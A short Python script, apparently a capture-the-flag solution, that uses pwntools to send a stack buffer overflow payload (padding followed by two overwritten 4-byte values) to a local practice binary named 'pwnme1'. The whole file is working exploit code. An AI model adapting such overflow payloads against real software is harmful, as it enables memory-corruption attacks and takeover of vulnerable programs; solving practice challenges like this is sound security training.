from templates import buff_overflow
import pwn

def main():
    payload = b"a" * (0x70 + 8) + b"\xBE\xB4\x00\x00" + b"\x47\x7B\xF4\x00"

    buff_overflow(
        payload,
        pwn.process("./pwnme1"),
        interactive = False
    )


main()
